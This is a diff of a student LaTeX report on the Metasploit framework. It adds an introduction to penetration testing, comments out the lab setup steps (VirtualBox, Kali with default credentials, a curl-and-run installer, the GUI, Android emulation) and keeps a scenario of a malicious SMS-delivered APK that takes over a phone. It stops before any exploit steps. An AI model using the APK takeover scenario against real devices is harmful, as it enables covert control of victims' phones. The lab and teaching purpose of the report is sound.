@@ -33,339 +33,354 @@
 \date{Due: October, 19th 2021}
 \maketitle
 \tableofcontents{}
+\chapter{Metasploit}
+The growth and widespread adoption of technology and the internet can be compared to a double-edged sword. While the globe is more interconnected than ever, this almost unanimous adoption of technology has brought with it some issues and problems of its’ own. One such major issue is the increased security risk people undertake by participating in the use of technology and the internet. Before the most risk you would be in was if you had dropped important documents while nowadays an attacker could access this information through some nefarious mean without even alerting you or the targeted institution. The simplest was to guard against these on a large scale without sacrificing the comfort of using technology or the internet is to develop and put in place security measures to block these kinds of attacks. 
+
+The Metasploit framework was developed to aid in this process by providing a structured and contained way to attempt penetration on a system to test the security measures and their effectiveness.  This is helpful for both countering security in the wrong hands as well as aiding in improving the security of organisations.
+\section{What is Metasploit?}
+Before we can describe the ways that Metasploit can help organisations and how it counters security in the wrong hands, we need to understand what Metasploit is and how it functions. Metasploit and its’ framework were originally designed and developed as a tool for security experts in various fields such as network security, security administrators, product vendors and any other security experts to use within their own field according to the specific needs of each.\cite{testIDS}
+
+Other than that, Metasploit is describes as a tool that collectively combines exploits into one central hub for security experts and researchers or alternatively as a project that contains information pertaining to security vulnerabilities and aids in the penetration testing of a system as well as the development of an intrusion detection system.\cite{goodDef, testIDS}
+
+Penetration testing is a method of identifying certain vulnerabilities within a system be it a computer, network or website. As a process, it includes gathering data on the system to determine where vulnerabilities may lie and then attempt to exploit them to test the measures put in place.\cite{goodDef}
+
+
+
 \chapter{Installation and Setup}
-\section{Project files}
-The project files can be found on the following GitHub link:\\
-\url{https://github.com/AM-ops/MetasploitProject/}
-\\\\This was our main code repository. We both have been updating the code as we went along and added details and bug fixes to the project.\\\\
-To copy the code to your own machine, follow the following steps:
-\begin{enumerate}
-\item Make sure Git is installed. If not it can be downloaded from here:\\
-\url{https://git-scm.com/}
-\item Create an empty directory where the code can be copied to
-\item Run the following command:
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-]
-{Shell}
-git clone https://github.com/AM-ops/MetasploitProject.git
-\end{minted}
-\end{enumerate}
-\section{Virtual Environments}
-\label{sec:sec2}
-There are multiple advantages of using virtual environments when testing for vulnerabilities and exploits in computer security. The primary reason being we create a layer of separation and abstraction between our host machine and our virtual environments. This 'sand-boxing' allows for analysis of threats in a contained environment.
-\subsection{VirtualBox}
-We made use of Oracle's VirtualBox software for the virtualisation. This can be downloaded from the following link: \url{https://www.virtualbox.org/wiki/Downloads}\\
-Below is a screenshot of the site. We also chose the \texttt{Windows hosts} option to download. Other hosts can also be utilised such as Linux hosts, or OS X hosts.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.3]{pics/vbmain.PNG}
-    \caption{Oracle's VirtualBox Download Page}
-\end{figure}
-Once the file has been downloaded, open it. Thereafter follow the default prompts of the installation. Below are some figures illustrating this.
-\begin{multicols}{2}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/vb1.PNG}
-    \caption{Screen 1}
-\end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/vb2.PNG}
-    \caption{Screen 2}
-\end{figure}
-\end{multicols}
-Click on \textbf{Next} for both above screens
-\begin{multicols}{2}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/vb3.PNG}
-    \caption{Screen 3}
-\end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/vb4.PNG}
-    \caption{Screen 4}
-\end{figure}
-\end{multicols}
-Click on \textbf{Next} for both of the above screens
-\begin{multicols}{2}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/vb5.PNG}
-    \caption{Screen 5}
-\end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/vb6.PNG}
-    \caption{Screen 6}
-\end{figure}
-\end{multicols}
-Click on \textbf{Next} and then \textbf{Finish}
-\section{Kali Linux}
-The next step is to acquire an Operating System for carrying out our Penetration Testing. For this purpose we utilised \texttt{Kali Linux}. The main site for this OS is: \url{https://www.kali.org/}\\\\
-According to them they quote the following:
-\begin{displayquote}
-"\textbf{The Most Advanced Penetration Testing Distribution}\\
-\textit{Kali Linux is an open-source, Debian-based Linux distribution geared towards various information security tasks, such as Penetration Testing, Security Research, Computer Forensics and Reverse Engineering.}"
-\end{displayquote}
-\pagebreak
-The main site looks as follows
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/kali.PNG}
-    \caption{Kali Linux's Homepage}
-\end{figure}
-Click on the \texttt{Download} button to see the different options available. Below the options are shown.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/kalidown.PNG}
-    \caption{Kali Linux's different download options}
-\end{figure}
-The option we chose is the \texttt{Virtual Machines} one. Thereafter you are presented with the two options available.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/kalivb.PNG}
-    \caption{The 2 options for Virtual Machines}
-\end{figure}
-Select the \texttt{VirtualBox} option and click on the direct download link.\\\\
-After the download is completed it is time to set up Kali Linux inside VirtualBox. To achieve this open up the file and thereafter change the following settings.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/vbkali1.PNG}
-    \caption{The main screen once the file is opened}
-\end{figure}
-Click on \textbf{Import} thereafter click on \textbf{Agree} on the Software Licence Agreement screen. The Kali Linux virtual machine will begin installing. Wait for it to be completed. Depending on the hardware available, it will be done in a few minutes.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/vbkali2.PNG}
-    \caption{Software Licence Agreement screen}
-\end{figure}
-Once the installation is completed Oracle's VirtualBox will open to the following main screen. The newly installed Kali Linux is shown on the left of the main screen.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/vbkalimain.PNG}
-    \caption{VirtualBox's main screen}
-\end{figure}
-Before starting up the Kali Linux virtual machine, a few settings have to be changed. Click on the \textbf{Settings} icon which is shown by a yellow gear icon. Navigate to \textbf{Systems} setting, and thereafter assign the recommended amount of \texttt{Base memory} under the \texttt{Motherboard} tab.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/settings1.PNG}
-    \caption{Systems settings: Motherboard tab}
-\end{figure}
-Under the \texttt{Processor} tab assign the recommended amount of \texttt{Processor(s)} as well as check the \texttt{Enable Nested VT-x/AMD-V} option.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/settings2.PNG}
-    \caption{Systems settings: Processor tab}
-\end{figure}
-If any errors are shown in the Settings for USB, then under the \texttt{USB} settings make sure that the \texttt{USB 1.1 (OHCI) Controller} option is only selected.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/settings3.PNG}
-    \caption{USB settings}
-\end{figure}
-Click \textbf{OK} to save all your settings changes. You should now be able to start up the Kali Linux virtual machine. Click on the \texttt{Start} icon which is shown by a green arrow. Once the virtual machine starts up you will be taken to the login screen. enter the following for the username and password:
-\begin{itemize}
-    \item Username: \texttt{kali}
-    \item Password: \texttt{kali}
-\end{itemize}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/kalimain.PNG}
-    \caption{Kali Linux login screen}
-\end{figure}
-Once you are successful in logging in, you will be greeted by the following splash screen of the Desktop.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/kalihome.PNG}
-    \caption{Kali Linux's Desktop}
-\end{figure}
-\section{Metasploit on Kali Linux}
-\subsection{Installation for the command line}
-By default Kali Linux comes with Metasploit out-of-the-box. However, to install Metasploit on a Linux operating system the following has to be done.
-Go to the following GitHub url:\\ \url{https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers}\\
-Copy the following command: 
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/
-templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
-  chmod 755 msfinstall && \
-  ./msfinstall
-\end{minted}
-Open up the terminal and paste the command copied. Thereafter press \textbf{Enter} to run it. If a password is required, Enter: \texttt{kali}\\\\
-Once the package has been installed you will see the screen as shown in Figure~\ref{fig:fig11}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/meta1.PNG}
-    \caption{Metasploit Framework's GitHub page}
-\end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/meta2.PNG}
-    \caption{Terminal asks for root access}
-\end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/meta3.PNG}
-    \caption{Terminal completed installing package}
-    \label{fig:fig11}
-\end{figure}
-\subsection{Graphical User Interface (GUI) installation}
-To install the Graphical User Interface (GUI) go to the following GitHub url:\\ \url{https://github.com/scriptjunkie/msfgui}\\\\
-Thereafter run the following command in the terminal (Preferably change the directory to the Desktop beforehand):
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-cd ~/Desktop
-git clone https://github.com/scriptjunkie/msfgui.git
-\end{minted}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.4]{pics/meta4.PNG}
-    \caption{GUI folder added to the Desktop}
-\end{figure}
-A directory titled \texttt{msfgui} will now to added to your Desktop. To run the GUI the following steps have to be carried out.\\
-Firstly change directories to the following: \texttt{/opt/metasploit-framework/bin}. This can be done by running the command below in the terminal.
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-cd /opt/metasploit-framework/bin
-\end{minted}
-Thereafter run the \texttt{msfconsole} shell script. This can be done by running the command below.
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-sudo ./msfconsole
-\end{minted}
-If you are prompted for a root password, Enter: \texttt{kali}. Thereafter, If you are prompted with the following: \textit{"Would you like to use and setup a new database (recommended)?"}, Type \textbf{n} or \textbf{no} and press \textbf{Enter}.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/startm1.PNG}
-    \caption{Type 'n' for No}
-\end{figure}
-Thereafter once ever thing is completed you should see that the terminal now has changed its prompt to the following.
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-msf6 > _
-\end{minted}
-This is shown in the picture below. This means that the Metasploit Framework has started up its service in the terminal. With this being done we can now move on to the next step of running the Graphical User Interface (GUI). Firstly you will have to open up a new terminal and change directories to the Desktop. So we can access the directory that was recently created i.e. \texttt{msfgui}. The commands are shown after Figure~\ref{fig:fig12}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/startm2.PNG}
-    \caption{Type 'n' for No}
-    \label{fig:fig12}
-\end{figure}
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-cd ~/Desktop/msfgui
-\end{minted}
-Thereafter run the \texttt{msfgui} shell script. This can be done by running the command below.
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-./msfgui
-\end{minted}
-Make sure the other terminal that is running the Metasploit command line is also running when the above mentioned command is run. If you are shown the prompt below. Click on \textbf{Yes}.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.4]{pics/prompt1.PNG}
-\end{figure}
-Thereafter another window will pop up. Let it automatically make a choice. If it does not close, then click on the option \texttt{Start new msfrpcd} as shown in the figure below.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.4]{pics/prompt2.PNG}
-\end{figure}
-The Metasploit Framework Graphical User Interface (GUI) will now be up and running. This is shown in the figure below.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.4]{pics/metaguimain.PNG}
-    \caption{The main screen for the Metasploit Framework GUI}
-\end{figure}
-\section{Android Emulation}
-For the first scenario covered in Section~\ref{sec:sec1} we will utilise an Emulator to virtualise an Android phone. This is keeping in line with the topic of virtualisation mentioned in Section~\ref{sec:sec2}. To emulate such a device you will need the Android Software Development Kit (SDK) or an ISO image which can be downloaded for VirtualBox. The SDK can be downloaded from the following url: \url{https://developer.android.com/studio}. Below is a screenshot of this page.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.4]{pics/as1.PNG}
-    \caption{Homepage of Android Studio}
-\end{figure}
-The url for the ISO image can be acquired from the Android-x86 Project's site located at: \url{https://www.android-x86.org/}\\
-Below is screenshot of this site.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/andro-proj.PNG}
-    \caption{Homepage of Android-x86}
-\end{figure}
-Once the ISO image has been downloaded create a new virtual machine in VirtualBox and attach the ISO. Thereafter assign the default recommended amounts of Processors, Storage, Memory etc. as was done with Kali Linux above. Below is a screenshot of the VM once it has been set up.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/andro-proj2.PNG}
-    \caption{Android VM main screen}
-\end{figure}
+For further details have a look at our blog page for the setup that was done. It is located at the following link:\\
+\url{https://ITRI625.github.io/post3.html}
+% \section{Project files}
+% The project files can be found on the following GitHub link:\\
+% \url{https://github.com/AM-ops/MetasploitProject/}
+% \\\\This was our main code repository. We both have been updating the code as we went along and added details and bug fixes to the project.\\\\
+% To copy the code to your own machine, follow the following steps:
+% \begin{enumerate}
+% \item Make sure Git is installed. If not it can be downloaded from here:\\
+% \url{https://git-scm.com/}
+% \item Create an empty directory where the code can be copied to
+% \item Run the following command:
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% ]
+% {Shell}
+% git clone https://github.com/AM-ops/MetasploitProject.git
+% \end{minted}
+% \end{enumerate}
+% \section{Virtual Environments}
+% \label{sec:sec2}
+% There are multiple advantages of using virtual environments when testing for vulnerabilities and exploits in computer security. The primary reason being we create a layer of separation and abstraction between our host machine and our virtual environments. This 'sand-boxing' allows for analysis of threats in a contained environment.
+% \subsection{VirtualBox}
+% We made use of Oracle's VirtualBox software for the virtualisation. This can be downloaded from the following link: \url{https://www.virtualbox.org/wiki/Downloads}\\
+% Below is a screenshot of the site. We also chose the \texttt{Windows hosts} option to download. Other hosts can also be utilised such as Linux hosts, or OS X hosts.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.3]{pics/vbmain.PNG}
+%     \caption{Oracle's VirtualBox Download Page}
+% \end{figure}
+% Once the file has been downloaded, open it. Thereafter follow the default prompts of the installation. Below are some figures illustrating this.
+% \begin{multicols}{2}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/vb1.PNG}
+%     \caption{Screen 1}
+% \end{figure}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/vb2.PNG}
+%     \caption{Screen 2}
+% \end{figure}
+% \end{multicols}
+% Click on \textbf{Next} for both above screens
+% \begin{multicols}{2}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/vb3.PNG}
+%     \caption{Screen 3}
+% \end{figure}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/vb4.PNG}
+%     \caption{Screen 4}
+% \end{figure}
+% \end{multicols}
+% Click on \textbf{Next} for both of the above screens
+% \begin{multicols}{2}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/vb5.PNG}
+%     \caption{Screen 5}
+% \end{figure}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/vb6.PNG}
+%     \caption{Screen 6}
+% \end{figure}
+% \end{multicols}
+% Click on \textbf{Next} and then \textbf{Finish}
+% \section{Kali Linux}
+% The next step is to acquire an Operating System for carrying out our Penetration Testing. For this purpose we utilised \texttt{Kali Linux}. The main site for this OS is: \url{https://www.kali.org/}\\\\
+% According to them they quote the following:
+% \begin{displayquote}
+% "\textbf{The Most Advanced Penetration Testing Distribution}\\
+% \textit{Kali Linux is an open-source, Debian-based Linux distribution geared towards various information security tasks, such as Penetration Testing, Security Research, Computer Forensics and Reverse Engineering.}"
+% \end{displayquote}
+% \pagebreak
+% The main site looks as follows
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/kali.PNG}
+%     \caption{Kali Linux's Homepage}
+% \end{figure}
+% Click on the \texttt{Download} button to see the different options available. Below the options are shown.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/kalidown.PNG}
+%     \caption{Kali Linux's different download options}
+% \end{figure}
+% The option we chose is the \texttt{Virtual Machines} one. Thereafter you are presented with the two options available.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/kalivb.PNG}
+%     \caption{The 2 options for Virtual Machines}
+% \end{figure}
+% Select the \texttt{VirtualBox} option and click on the direct download link.\\\\
+% After the download is completed it is time to set up Kali Linux inside VirtualBox. To achieve this open up the file and thereafter change the following settings.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/vbkali1.PNG}
+%     \caption{The main screen once the file is opened}
+% \end{figure}
+% Click on \textbf{Import} thereafter click on \textbf{Agree} on the Software Licence Agreement screen. The Kali Linux virtual machine will begin installing. Wait for it to be completed. Depending on the hardware available, it will be done in a few minutes.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/vbkali2.PNG}
+%     \caption{Software Licence Agreement screen}
+% \end{figure}
+% Once the installation is completed Oracle's VirtualBox will open to the following main screen. The newly installed Kali Linux is shown on the left of the main screen.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/vbkalimain.PNG}
+%     \caption{VirtualBox's main screen}
+% \end{figure}
+% Before starting up the Kali Linux virtual machine, a few settings have to be changed. Click on the \textbf{Settings} icon which is shown by a yellow gear icon. Navigate to \textbf{Systems} setting, and thereafter assign the recommended amount of \texttt{Base memory} under the \texttt{Motherboard} tab.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/settings1.PNG}
+%     \caption{Systems settings: Motherboard tab}
+% \end{figure}
+% Under the \texttt{Processor} tab assign the recommended amount of \texttt{Processor(s)} as well as check the \texttt{Enable Nested VT-x/AMD-V} option.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/settings2.PNG}
+%     \caption{Systems settings: Processor tab}
+% \end{figure}
+% If any errors are shown in the Settings for USB, then under the \texttt{USB} settings make sure that the \texttt{USB 1.1 (OHCI) Controller} option is only selected.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/settings3.PNG}
+%     \caption{USB settings}
+% \end{figure}
+% Click \textbf{OK} to save all your settings changes. You should now be able to start up the Kali Linux virtual machine. Click on the \texttt{Start} icon which is shown by a green arrow. Once the virtual machine starts up you will be taken to the login screen. enter the following for the username and password:
+% \begin{itemize}
+%     \item Username: \texttt{kali}
+%     \item Password: \texttt{kali}
+% \end{itemize}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/kalimain.PNG}
+%     \caption{Kali Linux login screen}
+% \end{figure}
+% Once you are successful in logging in, you will be greeted by the following splash screen of the Desktop.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/kalihome.PNG}
+%     \caption{Kali Linux's Desktop}
+% \end{figure}
+% \section{Metasploit on Kali Linux}
+% \subsection{Installation for the command line}
+% By default Kali Linux comes with Metasploit out-of-the-box. However, to install Metasploit on a Linux operating system the following has to be done.
+% Go to the following GitHub url:\\ \url{https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers}\\
+% Copy the following command: 
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/
+% templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+%   chmod 755 msfinstall && \
+%   ./msfinstall
+% \end{minted}
+% Open up the terminal and paste the command copied. Thereafter press \textbf{Enter} to run it. If a password is required, Enter: \texttt{kali}\\\\
+% Once the package has been installed you will see the screen as shown in Figure~\ref{fig:fig11}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/meta1.PNG}
+%     \caption{Metasploit Framework's GitHub page}
+% \end{figure}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/meta2.PNG}
+%     \caption{Terminal asks for root access}
+% \end{figure}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/meta3.PNG}
+%     \caption{Terminal completed installing package}
+%     \label{fig:fig11}
+% \end{figure}
+% \subsection{Graphical User Interface (GUI) installation}
+% To install the Graphical User Interface (GUI) go to the following GitHub url:\\ \url{https://github.com/scriptjunkie/msfgui}\\\\
+% Thereafter run the following command in the terminal (Preferably change the directory to the Desktop beforehand):
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% cd ~/Desktop
+% git clone https://github.com/scriptjunkie/msfgui.git
+% \end{minted}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.4]{pics/meta4.PNG}
+%     \caption{GUI folder added to the Desktop}
+% \end{figure}
+% A directory titled \texttt{msfgui} will now to added to your Desktop. To run the GUI the following steps have to be carried out.\\
+% Firstly change directories to the following: \texttt{/opt/metasploit-framework/bin}. This can be done by running the command below in the terminal.
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% cd /opt/metasploit-framework/bin
+% \end{minted}
+% Thereafter run the \texttt{msfconsole} shell script. This can be done by running the command below.
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% sudo ./msfconsole
+% \end{minted}
+% If you are prompted for a root password, Enter: \texttt{kali}. Thereafter, If you are prompted with the following: \textit{"Would you like to use and setup a new database (recommended)?"}, Type \textbf{n} or \textbf{no} and press \textbf{Enter}.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/startm1.PNG}
+%     \caption{Type 'n' for No}
+% \end{figure}
+% Thereafter once ever thing is completed you should see that the terminal now has changed its prompt to the following.
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% msf6 > _
+% \end{minted}
+% This is shown in the picture below. This means that the Metasploit Framework has started up its service in the terminal. With this being done we can now move on to the next step of running the Graphical User Interface (GUI). Firstly you will have to open up a new terminal and change directories to the Desktop. So we can access the directory that was recently created i.e. \texttt{msfgui}. The commands are shown after Figure~\ref{fig:fig12}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/startm2.PNG}
+%     \caption{Type 'n' for No}
+%     \label{fig:fig12}
+% \end{figure}
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% cd ~/Desktop/msfgui
+% \end{minted}
+% Thereafter run the \texttt{msfgui} shell script. This can be done by running the command below.
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% ./msfgui
+% \end{minted}
+% Make sure the other terminal that is running the Metasploit command line is also running when the above mentioned command is run. If you are shown the prompt below. Click on \textbf{Yes}.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.4]{pics/prompt1.PNG}
+% \end{figure}
+% Thereafter another window will pop up. Let it automatically make a choice. If it does not close, then click on the option \texttt{Start new msfrpcd} as shown in the figure below.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.4]{pics/prompt2.PNG}
+% \end{figure}
+% The Metasploit Framework Graphical User Interface (GUI) will now be up and running. This is shown in the figure below.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.4]{pics/metaguimain.PNG}
+%     \caption{The main screen for the Metasploit Framework GUI}
+% \end{figure}
+% \section{Android Emulation}
+% For the first scenario covered in Section~\ref{sec:sec1} we will utilise an Emulator to virtualise an Android phone. This is keeping in line with the topic of virtualisation mentioned in Section~\ref{sec:sec2}. To emulate such a device you will need the Android Software Development Kit (SDK) or an ISO image which can be downloaded for VirtualBox. The SDK can be downloaded from the following url: \url{https://developer.android.com/studio}. Below is a screenshot of this page.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.4]{pics/as1.PNG}
+%     \caption{Homepage of Android Studio}
+% \end{figure}
+% The url for the ISO image can be acquired from the Android-x86 Project's site located at: \url{https://www.android-x86.org/}\\
+% Below is screenshot of this site.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/andro-proj.PNG}
+%     \caption{Homepage of Android-x86}
+% \end{figure}
+% Once the ISO image has been downloaded create a new virtual machine in VirtualBox and attach the ISO. Thereafter assign the default recommended amounts of Processors, Storage, Memory etc. as was done with Kali Linux above. Below is a screenshot of the VM once it has been set up.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/andro-proj2.PNG}
+%     \caption{Android VM main screen}
+% \end{figure}
 % Therefore open up the link in the browser of Kali Linux and click on button \textbf{Download Android Studio}. Thereafter Agree to the Terms and Conditions and click on the \textbf{Download Android Studio} button once again.
 % \begin{figure}[H]
 %     \centering
@@ -546,23 +561,23 @@ Once the ISO image has been downloaded create a new virtual machine in VirtualBo
 %     \includegraphics[scale=1]{pics/as23.PNG}
 %     \caption{The Android Emulator running}
 % \end{figure}
-\section{Network setup in VirtualBox}
-Networking is a key aspect of what makes or breaks the exploits covered in further chapters. Therefore the following steps have to be taken so that an internal virtual network can created which will allow the virtual machines to communicate with each other effectively and without worrying about gateways and other network related issues that can pop up.\\\\
-Navigate to Oracle VirtualBox and click on \textbf{File -$>$ Preferences}. This is shown below.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.8]{pics/net1.png}
-\end{figure}
-Navigate to the \texttt{Network} tab on the left hand side. Thereafter, click on the green plus icon the right to create a new \textbf{NatNetwork}. This is shown below.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=1]{pics/net2.png}
-\end{figure}
-Click \textbf{OK} to save the settings. Now go to the settings for each of your virtual machines and under the \texttt{Network} tab select the newly created Nat Network as your Adapter. This is demonstrated below.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=1]{pics/net3.png}
-\end{figure}
+% \section{Network setup in VirtualBox}
+% Networking is a key aspect of what makes or breaks the exploits covered in further chapters. Therefore the following steps have to be taken so that an internal virtual network can created which will allow the virtual machines to communicate with each other effectively and without worrying about gateways and other network related issues that can pop up.\\\\
+% Navigate to Oracle VirtualBox and click on \textbf{File -$>$ Preferences}. This is shown below.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.8]{pics/net1.png}
+% \end{figure}
+% Navigate to the \texttt{Network} tab on the left hand side. Thereafter, click on the green plus icon the right to create a new \textbf{NatNetwork}. This is shown below.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=1]{pics/net2.png}
+% \end{figure}
+% Click \textbf{OK} to save the settings. Now go to the settings for each of your virtual machines and under the \texttt{Network} tab select the newly created Nat Network as your Adapter. This is demonstrated below.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=1]{pics/net3.png}
+% \end{figure}
 \section{Blog}
 The blog we created was hosted on GitHub Pages. The link to the blog is:\\
 \url{https://ITRI625.github.io}\\\\
@@ -579,174 +594,185 @@ The scenario is described as follows:
 \textit{A person (that will be known as the victim in further discussions), opens a SMS received on their mobile device. This SMS has a malicious link embedded in it, or has a link that redirects to a malicious site. The link automatically downloads and runs an Android application package also known in other terms as an APK file. This APK file is what the Android Operating System uses to install applications. This malicious Application, once installed gives the Hacker (known as a perpetrator in an attack) full control over the device to outside parties, including the perpetrator. From here on out, the perpetrator has the victim in the palm of their hands, and can do what every they like to the device as well as carry out further attacks against the victim.}
 \end{displayquote}
 \section{Carrying out the exploit}
-Here are the steps taken to exploit the Android virtual machine.\\\\
